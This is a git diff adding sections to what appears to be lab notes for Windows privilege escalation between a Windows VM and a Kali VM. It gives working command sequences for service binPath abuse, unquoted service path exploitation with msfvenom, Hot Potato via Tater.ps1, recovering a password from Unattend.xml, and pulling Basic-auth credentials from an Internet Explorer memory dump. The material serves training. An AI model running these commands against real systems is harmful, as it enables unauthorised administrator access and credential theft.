@@ -219,8 +219,65 @@ sc start dllsvc
 ````
 net localgroup administrators
 ````
-
-
+## Service Escalation binPath
+- Detection
+- Windows VM
+- Open command prompt and type: 
+````
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+````
+- Notice that the output suggests that the user `User-PC\User` has the `SERVICE_CHANGE_CONFIG` permission.
+- Exploitation
+- Windows VM
+- In command prompt type: `sc config daclsvc binpath= "net localgroup administrators user /add"`
+- In command prompt type: `sc start daclsvc`
+- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
+## Unquoted Service Path
+- Detection
+- Windows VM
+- Open command prompt and type: `sc qc unquotedsvc`
+- Notice that the `BINARY_PATH_NAME` field displays a path that is not confined between quotes.
+- Exploitation
+- Kali VM
+- Open command prompt and type: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
+- Copy the generated file, `common.exe`, to the Windows VM.
+- Windows VM
+- Place common.exe in `"C:\Program Files\Unquoted Path Service"`.
+- Open command prompt and type: `sc start unquotedsvc`
+- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
+## Hot Potato
+- Exploitation
+- Windows VM
+- In command prompt type: `powershell.exe -nop -ep bypass`
+- In Power Shell prompt type: `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
+- In Power Shell prompt type: `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
+- To confirm that the attack was successful, in Power Shell prompt type: `net localgroup administrators`
+## Password Mining Escalation Configuration Files
+- Exploitation
+- Windows VM
+- Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml
+- Scroll down to the `"<Password>"` property and copy the base64 string that is confined between the `"<Value>"` tags underneath it.
+- Kali VM
+- In a terminal, type: `echo [copied base64] | base64 -d`
+- Notice the cleartext password
+## Password Mining Escalation Memory 
+- Exploitation
+- Kali VM
+- Open command prompt and type: `msfconsole`
+- In Metasploit (msf > prompt) type: `use auxiliary/server/capture/http_basic`
+- In Metasploit (msf > prompt) type: `set uripath x`
+- In Metasploit (msf > prompt) type: `run`
+- Windows VM
+- Open Internet Explorer and browse to: `http://[Kali VM IP Address]/x`
+- Open command prompt and type: taskmgr
+- In Windows Task Manager, right-click on the `iexplore.exe` in the `Image Name` columnand select `Create Dump File` from the popup menu.
+- Copy the generated file, `iexplore.DMP`, to the Kali VM.
+- Kali VM
+- Place `iexplore.DMP` on the desktop.
+- Open command prompt and type: strings `/root/Desktop/iexplore.DMP | grep "Authorization: Basic"`
+- Select the Copy the Base64 encoded string.
+- In command prompt type: `echo -ne [Base64 String] | base64 -d`
+- Notice the credentials in the output.
 
 
 
